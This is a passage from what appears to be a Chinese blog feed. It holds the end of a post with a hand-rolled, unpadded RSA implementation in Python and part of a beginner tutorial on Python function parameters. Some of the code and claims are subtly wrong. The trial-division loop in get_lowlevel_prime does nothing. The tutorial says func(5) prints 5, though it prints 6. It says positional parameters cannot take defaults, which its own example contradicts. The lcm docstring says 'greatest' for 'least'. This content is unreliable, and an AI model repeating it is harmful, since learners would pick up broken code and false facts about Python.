class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_n_bit_odd</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>):<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   生成大数,不确定是不是素数</span><br><span class="hljs-string">   :param n:</span><br><span class="hljs-string">   :return:大数</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">assert</span> n &gt; <span class="hljs-number">1</span><br>   <span class="hljs-keyword">return</span> randrange(<span class="hljs-number">2</span> ** (n - <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>, <span class="hljs-number">2</span> ** n, <span class="hljs-number">2</span>)<br><br><br>first_50_primes = [<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">23</span>, <span class="hljs-number">29</span>, <span class="hljs-number">31</span>,<br>                  <span class="hljs-number">37</span>, <span class="hljs-number">41</span>, <span class="hljs-number">43</span>, <span class="hljs-number">47</span>, <span class="hljs-number">53</span>, <span class="hljs-number">59</span>, <span class="hljs-number">61</span>, <span class="hljs-number">67</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>,<br>                  <span class="hljs-number">79</span>, <span class="hljs-number">83</span>, <span class="hljs-number">89</span>, <span class="hljs-number">97</span>, <span class="hljs-number">101</span>, <span class="hljs-number">103</span>, <span class="hljs-number">107</span>, <span class="hljs-number">109</span>, <span class="hljs-number">113</span>, <span class="hljs-number">127</span>,<br>                  <span class="hljs-number">131</span>, <span class="hljs-number">137</span>, <span class="hljs-number">139</span>, <span class="hljs-number">149</span>, <span class="hljs-number">151</span>, <span class="hljs-number">157</span>, <span class="hljs-number">163</span>, <span class="hljs-number">167</span>, <span class="hljs-number">173</span>, <span class="hljs-number">179</span>,<br>                  <span class="hljs-number">181</span>, <span class="hljs-number">191</span>, <span class="hljs-number">193</span>, <span class="hljs-number">197</span>, <span class="hljs-number">199</span>, <span class="hljs-number">211</span>, <span class="hljs-number">223</span>, <span class="hljs-number">227</span>, <span class="hljs-number">229</span>, <span class="hljs-number">233</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lowlevel_prime</span>(<span class="hljs-params">n</span>):<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   选择满足不能够整除前50个素数的大数，没找到就一直循环</span><br><span class="hljs-string">   :param n:</span><br><span class="hljs-string">   :return:</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>       c = generate_n_bit_odd(n)<br>       <span class="hljs-keyword">for</span> divisor <span class="hljs-keyword">in</span> first_50_primes:<br>           <span class="hljs-keyword">if</span> c % divisor == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> divisor ** <span class="hljs-number">2</span> &lt;= c:<br>               <span class="hljs-keyword">break</span><br>       <span class="hljs-keyword">return</span> c<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">miller_rabin_primality_check</span>(<span class="hljs-params">n, k=<span class="hljs-number">20</span></span>):<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   米勒-拉宾素性检验</span><br><span class="hljs-string">   由于假设n是一个素数，n-1=a^s*d,s和d是常量，改变a的值，检测20次</span><br><span class="hljs-string">   :param n:</span><br><span class="hljs-string">   :param k:</span><br><span class="hljs-string">   :return:</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">assert</span> n &gt; <span class="hljs-number">3</span><br>   <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>   <span class="hljs-comment"># 找出n-1 = 2^s*d</span><br>   s, d = <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span><br>   <span class="hljs-keyword">while</span> d % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>       d &gt;&gt;= <span class="hljs-number">1</span><br>       s += <span class="hljs-number">1</span><br><br>   <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>       a = randrange(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>       x = <span class="hljs-built_in">pow</span>(a, d, n)<br><br>       <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> x == n - <span class="hljs-number">1</span>:<br>           <span class="hljs-keyword">continue</span><br><br>       <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s):<br>           x = <span class="hljs-built_in">pow</span>(x, <span class="hljs-number">2</span>, n)<br>           <span class="hljs-keyword">if</span> x == n - <span class="hljs-number">1</span>:<br>               <span class="hljs-keyword">break</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_random_prime</span>(<span class="hljs-params">num_bits</span>):<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   获取大素数</span><br><span class="hljs-string">   :param num_bits:</span><br><span class="hljs-string">   :return:</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>       pp = get_lowlevel_prime(num_bits)<br>       <span class="hljs-keyword">if</span> miller_rabin_primality_check(pp):<br>           <span class="hljs-keyword">return</span> pp<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a, b</span>):<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   求最大公约数</span><br><span class="hljs-string">   :param a:</span><br><span class="hljs-string">   :param b:</span><br><span class="hljs-string">   :return:</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">while</span> b:<br>       a, b = b, a % b<br>   <span class="hljs-keyword">return</span> a<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lcm</span>(<span class="hljs-params">a, b</span>):<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   求最大公倍数</span><br><span class="hljs-string">   两个数的乘积等于它们的最大公约数和最小公倍数的乘积。</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">return</span> a // gcd(a, b) * b<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exgcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        gcd, x1, y1 = exgcd(b % a, a)<br>        x = y1 - (b // a) * x1<br>        y = x1<br>        <span class="hljs-keyword">return</span> gcd, x, y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">invmod</span>(<span class="hljs-params">e, m</span>):<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   求模逆元：知道x * e + y * m = g</span><br><span class="hljs-string">   :param e:</span><br><span class="hljs-string">   :param m:</span><br><span class="hljs-string">   :return:</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   g, d, y = exgcd(e, m)<br>   <span class="hljs-keyword">assert</span> g == <span class="hljs-number">1</span><br>   <span class="hljs-keyword">if</span> d &lt; <span class="hljs-number">0</span>:<br>       d += m<br>   <span class="hljs-keyword">return</span> d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uint_from_bytes</span>(<span class="hljs-params">xbytes: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   比特转换位整数</span><br><span class="hljs-string">   :param xbytes:</span><br><span class="hljs-string">   :return:</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>.from_bytes(xbytes, <span class="hljs-string">&#x27;big&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uint_to_bytes</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   整数转换成比特的时候，一个整数对应32位比特数</span><br><span class="hljs-string">   :param x:</span><br><span class="hljs-string">   :return:</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">if</span> x == <span class="hljs-number">0</span>:<br>       <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-number">1</span>)<br>   <span class="hljs-keyword">return</span> x.to_bytes((x.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>)  <span class="hljs-comment">#做到尽量不补零</span><br><br><br>RSA_DEFAULT_EXPONENT = <span class="hljs-number">65537</span><br>RSA_DEFAULT_MODULUS_LEN = <span class="hljs-number">2048</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RSA</span>:<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   RSA算法(self.n, self.e)加密密钥</span><br><span class="hljs-string">   (self.n, self.d)解密密钥</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key_length=RSA_DEFAULT_MODULUS_LEN,</span><br><span class="hljs-params">                exponent=RSA_DEFAULT_EXPONENT</span>):<br>       self.e = exponent<br>       t = <span class="hljs-number">0</span><br>       p = q = <span class="hljs-number">2</span>  <span class="hljs-comment"># 找出一个e使1&lt;e&lt;(p-1)*(q-1)</span><br>       <span class="hljs-keyword">while</span> gcd(self.e, t) != <span class="hljs-number">1</span>:<br>           p = get_random_prime(key_length // <span class="hljs-number">2</span>)<br>           q = get_random_prime(key_length // <span class="hljs-number">2</span>)<br>           t = lcm(p - <span class="hljs-number">1</span>, q - <span class="hljs-number">1</span>)<br><br>       self.n = p * q<br>       self.d = invmod(self.e, t)  <span class="hljs-comment"># 加密和解密使比特和整数之间的加解密</span><br><br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self, binary_data: <span class="hljs-built_in">bytes</span></span>):<br>       int_data = uint_from_bytes(binary_data)<br>       <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(int_data, self.e, self.n)<br><br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, encrypted_int_data: <span class="hljs-built_in">int</span></span>):<br>       int_data = <span class="hljs-built_in">pow</span>(encrypted_int_data, self.d, self.n)<br>       <span class="hljs-keyword">return</span> uint_to_bytes(int_data)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>   RSA_1 = RSA(<span class="hljs-number">2048</span>, <span class="hljs-number">65537</span>)<br>   msg = <span class="hljs-string">b&#x27;Complex RSA in Python&#x27;</span><br>   ctxt = RSA_1.encrypt(msg)<br>   m = RSA_1.decrypt(ctxt)<br>   <span class="hljs-built_in">print</span>(m)<br>   <span class="hljs-built_in">print</span>(ctxt)<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python（三）</title>
      <link href="/2024/05/04/%E5%87%BD%E6%95%B0/"/>
      <url>/2024/05/04/%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>在Python中，函数是一种基本的数据结构，它允许你将一段代码封装起来，以便重复使用。下面是对你提到的各个概念的解释和例子：</p><h3 id="1-不可变与可变参数："><a href="#1-不可变与可变参数：" class="headerlink" title="1.不可变与可变参数："></a><strong>1.不可变与可变参数</strong>：</h3><p>在Python中，可变参数（Mutable Arguments）和不可变参数（Immutable Arguments）是两种不同的参数类型，它们在函数内部的行为和用途上有所不同。</p><h4 id="不可变参数"><a href="#不可变参数" class="headerlink" title="不可变参数"></a><strong>不可变参数</strong></h4><p>不可变参数指的是在函数内部不能被修改的对象，如整数、浮点数、字符串、元组等。一旦一个不可变对象被创建，其值就不能被更改。</p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">a</span>):<br>    a = a + <span class="hljs-number">1</span>  <span class="hljs-comment"># 尝试修改不可变对象</span><br>    <span class="hljs-keyword">return</span> a<br>num = <span class="hljs-number">5</span><br><span class="hljs-built_in">print</span>(func(num))  <span class="hljs-comment"># 输出: 5，因为num是不可变的</span><br></code></pre></td></tr></table></figure><h4 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a><strong>可变参数</strong></h4><p>可变参数指的是在函数内部可以被修改的对象，如列表（List）、字典（Dictionary）、集合（Set）等。这些对象在函数内部可以被添加、删除或修改元素。</p><h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">lst</span>):<br>    lst.append(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 修改可变对象</span><br>    <span class="hljs-keyword">return</span> lst<br>my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br><span class="hljs-built_in">print</span>(func(my_list))  <span class="hljs-comment"># 输出: [1, 2, 3, 1]，因为my_list是可变的</span><br></code></pre></td></tr></table></figure><p>在实际编程中，了解可变参数和不可变参数的区别非常重要，因为它们会影响函数的行为和结果。在处理不可变对象时，需要注意，因为尝试修改它们可能会导致错误。而对于可变对象，你可以自由地添加、删除或修改它们的内容。</p><h3 id="2-位置参数："><a href="#2-位置参数：" class="headerlink" title="2.位置参数："></a><strong>2.位置参数</strong>：</h3><p>位置参数（Positional Arguments）是指在函数定义时按照参数位置顺序排列的参数。当你调用一个函数时，你需要按照函数定义中的参数顺序提供相应的值。</p><h5 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name, message=<span class="hljs-string">&quot;Hello&quot;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;打印一个问候语&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;message&#125;</span>, <span class="hljs-subst">&#123;name&#125;</span>!&quot;</span>)<br><span class="hljs-comment"># 调用函数，提供位置参数</span><br>greet(<span class="hljs-string">&quot;Alice&quot;</span>)  <span class="hljs-comment"># 输出: Hello, Alice!</span><br>greet(<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-string">&quot;Hi there&quot;</span>)  <span class="hljs-comment"># 输出: Hi there, Bob!</span><br></code></pre></td></tr></table></figure><p>在这个例子中，<code>greet</code> 函数定义了两个位置参数：<code>name</code> 和 <code>message</code>。在调用 <code>greet</code> 函数时，我们按照函数定义中的参数顺序提供值。如果没有提供第二个参数 <code>message</code> 的值，它将使用默认值 “Hello”。</p><h4 id="位置参数的特点"><a href="#位置参数的特点" class="headerlink" title="位置参数的特点"></a>位置参数的特点</h4><ol><li><strong>必须按照顺序提供</strong>：调用函数时，必须按照函数定义中的参数顺序提供值。</li><li><strong>参数名称不重要</strong>：位置参数的名称在调用时不需要指定，Python会根据位置来匹配参数。</li><li><strong>不能有默认值</strong>：位置参数不能有默认值，即在函数定义时不能指定默认值。</li><li><strong>可以有多个</strong>：一个函数可以有多个位置参数，但必须按照定义的顺序提供。<br> 位置参数是函数定义中最常见的一种参数类型，它允许你直接通过位置来传递参数，使得函数调用更加直观和易于理解。</li></ol><h3 id="3-关键字参数："><a href="#3-关键字参数：" class="headerlink" title="3.关键字参数："></a><strong>3.关键字参数</strong>：</h3><p>函数的关键字参数允许你通过参数名而不是位置来指定参数值。这意味着你可以在调用函数时以任意顺序提供参数，只要指定了参数名。关键字参数是在函数定义中使用 <code>=</code> 赋值的参数。</p><h5 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h5><p>展示了如何定义和使用关键字参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name, message=<span class="hljs-string">&quot;Hello&quot;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;打印一个问候语&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;message&#125;</span>, <span class="hljs-subst">&#123;name&#125;</span>!&quot;</span>)<br><span class="hljs-comment"># 使用关键字参数调用函数</span><br>greet(name=<span class="hljs-string">&quot;Alice&quot;</span>, message=<span class="hljs-string">&quot;Hi&quot;</span>)<br>greet(message=<span class="hljs-string">&quot;Hi&quot;</span>, name=<span class="hljs-string">&quot;Alice&quot;</span>)<br>greet(name=<span class="hljs-string">&quot;Bob&quot;</span>)<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>greet</code> 函数接受两个参数：<code>name</code> 和 <code>message</code>。<code>message</code> 参数有一个默认值 “Hello”。在调用 <code>greet</code> 函数时，我们可以通过指定参数名来提供值，这样可以不依赖于参数的顺序，并且可以在没有提供值时使用参数的默认值。</p><h4 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h4><ol><li>当函数有多个参数且其中一些参数有默认值时，使用关键字参数可以让代码更清晰，因为它们明确指出了每个参数的含义。</li><li>当你只想更新函数的某些参数而不是所有参数时，关键字参数非常有用。</li><li>当函数参数列表很长时，使用关键字参数可以避免记住参数的顺序，从而减少错误。<br>关键字参数必须在位置参数之后提供，否则会引发语法错误。例如，你不能在位置参数之前使用关键字参数：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">greet(name=<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-string">&quot;Hi&quot;</span>)  <span class="hljs-comment"># 这会引发语法错误</span><br></code></pre></td></tr></table></figure>正确的方式是：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">greet(<span class="hljs-string">&quot;Alice&quot;</span>, message=<span class="hljs-string">&quot;Hi&quot;</span>)  <span class="hljs-comment"># 这是正确的</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="4-缺省参数："><a href="#4-缺省参数：" class="headerlink" title="4.缺省参数："></a><strong>4.缺省参数</strong>：</h3><p>缺省参数（default parameter）是指在没有传入值的情况下，函数会使用默认值的参数。当你定义一个函数时，可以为参数设置默认值，这样在调用函数时如果不提供该参数的值，函数会使用默认值。</p><h5 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name, message=<span class="hljs-string">&quot;Hello&quot;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;打印一个问候语&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;message&#125;</span>, <span class="hljs-subst">&#123;name&#125;</span>!&quot;</span>)<br><span class="hljs-comment"># 使用缺省参数调用函数</span><br>greet(<span class="hljs-string">&quot;Alice&quot;</span>)            <span class="hljs-comment"># 使用了message的默认值&quot;Hello&quot;</span><br>greet(<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-string">&quot;Hi there&quot;</span>)  <span class="hljs-comment"># 覆盖了message的默认值</span><br></code></pre></td></tr></table></figure><p>在这个例子中，<code>greet</code> 函数有两个参数：<code>name</code> 和 <code>message</code>。<code>message</code> 参数有一个默认值 “Hello”。当我们调用 <code>greet</code> 函数时，如果没有为 <code>message</code> 提供值，它将自动使用默认值 “Hello”。<br>在使用缺省参数时，需要注意以下几点：</p><ol><li><strong>缺省参数通常应该放在参数列表的最后，这样可以避免在调用函数时出现不必要的混淆。</strong></li><li><strong>缺省参数的值在函数定义时只会计算一次，这意味着如果缺省参数是一个可变对象（如列表、字典或实例），那么在函数多次调用之间，这个对象可能会保留状态，这可能会导致意外的行为。</strong></li></ol><h5 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">append_to</span>(<span class="hljs-params">element, to=[]</span>):<br>    to.append(element)<br>    <span class="hljs-keyword">return</span> to<br>my_list = append_to(<span class="hljs-number">12</span>)<br><span class="hljs-built_in">print</span>(my_list)  <span class="hljs-comment"># 输出: [12]</span><br>another_list = append_to(<span class="hljs-number">42</span>)<br><span class="hljs-built_in">print</span>(another_list)  <span class="hljs-comment"># 输出: [12, 42]，这不是预期的行为</span><br></code></pre></td></tr></table></figure><p>为了避免这种问题，可以使用 <code>None</code> 作为缺省参数的默认值，然后在函数内部进行检查并分配一个新的对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">append_to</span>(<span class="hljs-params">element, to=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> to <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        to = []<br>    to.append(element)<br>    <span class="hljs-keyword">return</span> to<br>my_list = append_to(<span class="hljs-number">12</span>)<br><span class="hljs-built_in">print</span>(my_list)  <span class="hljs-comment"># 输出: [12]</span><br>another_list = append_to(<span class="hljs-number">42</span>)<br><span class="hljs-built_in">print</span>(another_list)  <span class="hljs-comment"># 输出: [42]，这是预期的行为</span><br></code></pre></td></tr></table></figure><p>这样，每次调用 <code>append_to</code> 函数时，如果没有提供 <code>to</code> 参数，它都会创建一个新的列表，从而避免了在不同调用之间共享状态的问题。</p><h3 id="5-不定长参数："><a href="#5-不定长参数：" class="headerlink" title="5.不定长参数："></a><strong>5.不定长参数</strong>：</h3><p>不定长参数（Var-Length Arguments）指的是函数可以接受任意数量的非关键字参数。这通常通过在函数定义中使用星号 <code>*</code> 来指定。<br>不定长参数可以分为两种：</p><h4 id="可变数量的位置参数"><a href="#可变数量的位置参数" class="headerlink" title="可变数量的位置参数"></a><strong>可变数量的位置参数</strong></h4><p>使用星号 <code>*</code> 跟随一个参数名，表示该参数可以接受任意数量的位置参数。这些参数会被打包成一个元组（tuple）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_info</span>(<span class="hljs-params">*vartuple</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;vartuple:&quot;</span>, vartuple)<br>print_info(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>)  <span class="hljs-comment"># 输出: vartuple: (10, 20, 30)</span><br></code></pre></td></tr></table></figure><h4 id="可变关键字参数"><a href="#可变关键字参数" class="headerlink" title="可变关键字参数"></a><strong>可变关键字参数</strong></h4><p>使用双星号 <code>**</code> 跟随一个参数名，表示该参数可以接受任意数量的关键字参数。这些参数会被打包成一个字典（dictionary）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_info</span>(<span class="hljs-params">**varkwargs</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;varkwargs:&quot;</span>, varkwargs)<br>print_info(name=<span class="hljs-string">&quot;Alice&quot;</span>, age=<span class="hljs-number">25</span>)  <span class="hljs-comment"># 输出: varkwargs: &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 25&#125;</span><br></code></pre></td></tr></table></figure><p>可变数量的位置参数和可变关键字参数可以同时使用，以允许函数接受任意数量的非关键字参数和任意数量的关键字参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_info</span>(<span class="hljs-params">*vartuple, **varkwargs</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;vartuple:&quot;</span>, vartuple)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;varkwargs:&quot;</span>, varkwargs)<br>print_info(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, name=<span class="hljs-string">&quot;Alice&quot;</span>, age=<span class="hljs-number">25</span>)  <span class="hljs-comment"># 输出:</span><br>                                                  <span class="hljs-comment"># vartuple: (10, 20, 30)</span><br>                                                  <span class="hljs-comment"># varkwargs: &#123;&#x27;name&#x27;: &#x27;Alice&#x27;, &#x27;age&#x27;: 25&#125;</span><br></code></pre></td></tr></table></figure><p>使用不定长参数时</p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul><li>不定长参数必须在函数定义中的其他位置参数之后。</li><li>不定长参数在函数调用时可以不提供值，也可以提供任意数量的值。</li><li>不定长参数的值会被收集到一个元组或字典中，而不是直接传递给函数的参数。</li><li>如果你需要访问不定长参数中的值，你可以使用 <code>*vartuple</code> 或 <code>**varkwargs</code> 来解包这些值。</li></ul><h3 id="6-匿名函数："><a href="#6-匿名函数：" class="headerlink" title="6.匿名函数："></a><strong>6.匿名函数</strong>：</h3><p>匿名函数（Anonymous Functions）也被称为Lambda函数，它们是没有名称的函数，通常只包含一个表达式。Lambda函数的语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">lambda</span> arguments: expression<br></code></pre></td></tr></table></figure><ul><li><code>arguments</code>：这是传递给Lambda函数的参数，可以是一个参数，也可以是多个参数，参数之间用逗号分隔。</li><li><code>expression</code>：这是Lambda函数执行的表达式，它的结果就是Lambda函数的返回值。<br>Lambda函数通常用于需要快速定义一个简单的、一次性的函数，或者用于Python的某些内置函数，如 <code>map()</code>、<code>filter()</code> 和 <code>sorted()</code>。</li></ul><h5 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 